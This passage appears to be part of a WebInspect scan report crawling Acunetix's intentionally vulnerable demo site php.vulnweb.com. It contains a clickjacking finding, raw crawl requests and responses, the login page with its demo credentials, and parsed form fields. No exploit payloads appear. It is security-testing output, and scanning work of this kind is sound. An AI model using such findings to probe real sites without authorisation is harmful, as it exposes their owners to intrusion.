‘none’ <br />Equivalent to “DENY” - deny all attempts to frame the page</li><li>‘self’ <br />Equivalent to “SAMEORIGIN” - the page can be framed by another page only if it belongs to the same origin as the page being framed</li><li> &lt;host-source&gt;<br />Equivalent to “ALLOW-FROM” - developers can specify a list of trusted origins which maybe host name or IP address or URL scheme. Only pages on this list of trusted origin are permitted to load this page inside an iframe</li><li>&lt;scheme-source&gt;<br />Developers can also specify a schema such as http: or https: that can frame the page.</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Frame Busting:</b><br /><a href="http://crypto.stanford.edu/~dabo/pubs/papers/framebust.pdf">Busting Frame Busting: A Study of Clickjacking Vulnerabilities on Popular Sites</a><br /><a href="https://www.owasp.org/images/0/0e/OWASP_AppSec_Research_2010_Busting_Frame_Busting_by_Rydstedt.pdf">OWASP: Busting Frame Busting</a><br /><br /><b>OWASP:</b><br /><a href="https://www.owasp.org/index.php/Clickjacking">Clickjacking</a><br /><br /><b>Content-Security-Policy (CSP)</b><br /><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors#Examples">CSP: frame-ancestors</a><br /><br /><b>Specification:</b><br /><a href="https://w3c.github.io/webappsec-csp/2/">Content Security Policy Level 2</a><br /><a href="http://tools.ietf.org/html/draft-ietf-websec-x-frame-options-01">X-Frame-Options IETF Draft</a><br /><br /><b>Server Configuration:</b><br /><a href="http://support.microsoft.com/kb/2694329">IIS</a><br /><a href="https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options">Apache, nginx</a><br /><br /><b>HP 2012 Cyber Security Report</b><br /><a href="http://www.hpenterprisesecurity.com/collateral/whitepaper/HP2012CyberRiskReport_0313.pdf">The X-Frame-Options header - a failure to launch</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="FB92768C75D0DC1076D2DC87A6E45F2F"><![CDATA[GET /login.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="FB92768C75D0DC1076D2DC87A6E45F2F";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="a2e0cdd1";
X-Request-Memo: ID="c0f05802";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:34 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5523

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>login page</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<h3>If you are already registered please enter your login information below:</h3><br>
	<form name="loginform" method="post" action="userinfo.php">
	<table cellpadding="4" cellspacing="1">
		<tr><td>Username : </td><td><input name="uname" type="text" size="20" style="width:120px;"></td></tr>
		<tr><td>Password : </td><td><input name="pass" type="password" size="20" style="width:120px;"></td></tr>
		<tr><td colspan="2" align="right"><input type="submit" value="login" style="width:75px;"></td></tr>
	</table>
	</form>
  	</div>
	<div class="story">
	<h3>
        You can also <a href="signup.php">signup here</a>.<br>
        Signup disabled. Please use the username <font color='red'>test</font> and the password <font color='red'>test</font>. 
    </h3>
	</div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="FB92768C75D0DC1076D2DC87A6E45F2F"><Method>GET</Method><Path>/</Path><File>login</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="FB92768C75D0DC1076D2DC87A6E45F2F";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="a2e0cdd1";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c0f05802";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>login page</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<h3>If you are already registered please enter your login information below:</h3><br>
	<form name="loginform" method="post" action="userinfo.php">
	<table cellpadding="4" cellspacing="1">
		<tr><td>Username : </td><td><input name="uname" type="text" size="20" style="width:120px;"></td></tr>
		<tr><td>Password : </td><td><input name="pass" type="password" size="20" style="width:120px;"></td></tr>
		<tr><td colspan="2" align="right"><input type="submit" value="login" style="width:75px;"></td></tr>
	</table>
	</form>
  	</div>
	<div class="story">
	<h3>
        You can also <a href="signup.php">signup here</a>.<br>
        Signup disabled. Please use the username <font color='red'>test</font> and the password <font color='red'>test</font>. 
    </h3>
	</div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:34 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5523</Value></Header></Headers><SetCookies /><Forms><Form><Action>userinfo.php</Action><Method>post</Method><Name>loginform</Name><OnSubmit /><InputFields><InputField><Name>uname</Name><Value /><Size>20</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>pass</Name><Value /><Size>20</Size><MaxLength>0</MaxLength><sType>password</sType><Class /></InputField><InputField><Name /><Value>login</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="CD7CD7A7B9BDF581BE0EF911AE43713F"><URL>http://php.vulnweb.com:80/AJAX/infocateg.php?id=3</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="CD7CD7A7B9BDF581BE0EF911AE43713F"><![CDATA[GET /AJAX/infocateg.php?id=3 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="CD7CD7A7B9BDF581BE0EF911AE43713F";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="59abd809";
X-Request-Memo: ID="d4ba2055";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:35 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 324

<iteminfo><name>Stickers</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></RawResponse><Request id="CD7CD7A7B9BDF581BE0EF911AE43713F"><Method>GET</Method><Path>/AJAX/</Path><File>infocateg</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=3</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>3</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="CD7CD7A7B9BDF581BE0EF911AE43713F";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="59abd809";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="d4ba2055";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Stickers</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:35 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>324</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="1EF73D22016229B907A53AA2C61E2FB8"><URL>http://php.vulnweb.com:80/AJAX/infocateg.php?id=4</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="1EF73D22016229B907A53AA2C61E2FB8"><![CDATA[GET /AJAX/infocateg.php?id=4 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="1EF73D22016229B907A53AA2C61E2FB8";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="4bf80c19";
X-Request-Memo: ID="0b626cc3";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:35 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 324

<iteminfo><name>Graffity</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></RawResponse><Request id="1EF73D22016229B907A53AA2C61E2FB8"><Method>GET</Method><Path>/AJAX/</Path><File>infocateg</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=4</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>4</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="1EF73D22016229B907A53AA2C61E2FB8";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="4bf80c19";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="0b626cc3";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo><name>Graffity</name><description>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</description></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:35 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>324</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="69D005B73F98A504435D20ACD9D25760"><URL>http://php.vulnweb.com:80/AJAX/titles.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="69D005B73F98A504435D20ACD9D25760"><![CDATA[GET /AJAX/titles.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="69D005B73F98A504435D20ACD9D25760";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="ffb275ce";
X-Request-Memo: ID="c427cb42";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:36 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 323

<items><item name="infotitle" id="1">The shore</item><item name="infotitle" id="2">Mistery</item><item name="infotitle" id="3">The universe</item><item name="infotitle" id="4">Walking</item><item name="infotitle" id="5">Mean</item><item name="infotitle" id="6">Thing</item><item name="infotitle" id="7">Trees</item></items>]]></RawResponse><Request id="69D005B73F98A504435D20ACD9D25760"><Method>GET</Method><Path>/AJAX/</Path><File>titles</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="69D005B73F98A504435D20ACD9D25760";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="AJAXInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="ffb275ce";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c427cb42";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path 